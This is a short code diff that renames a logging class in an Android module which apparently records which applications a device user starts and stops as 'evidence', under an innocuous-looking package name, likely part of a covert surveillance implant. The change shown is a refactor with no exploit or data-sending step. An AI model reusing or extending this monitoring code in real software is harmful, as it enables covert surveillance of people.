@@ -19,7 +19,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 
 import com.android.networking.evidence.EvidenceType;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.interfaces.IncrementalLog;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerProcess;
@@ -41,12 +41,12 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 
 	}
 
-	LogR logIncremental;
+	EvidenceReference logIncremental;
 
 	@Override
 	public void actualStart() {
 		// viene creato un file temporaneo di log application, aperto.
-		logIncremental = new LogR(EvidenceType.APPLICATION);
+		logIncremental = new EvidenceReference(EvidenceType.APPLICATION);
 		ListenerProcess.self().attach(this);
 	}
 
@@ -83,7 +83,7 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 		items.add(WChar.getBytes(name, true));
 		items.add(WChar.getBytes(status.name(), true));
 		items.add(WChar.getBytes(module, true));
-		items.add(ByteArray.intToByteArray(LogR.E_DELIMITER));
+		items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
 
 		if (Cfg.DEBUG) {
 			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
@@ -104,7 +104,7 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 		}
 		if (logIncremental.hasData()) {
 			logIncremental.close();
-			logIncremental = new LogR(EvidenceType.APPLICATION);
+			logIncremental = new EvidenceReference(EvidenceType.APPLICATION);
 		}
 	}
 
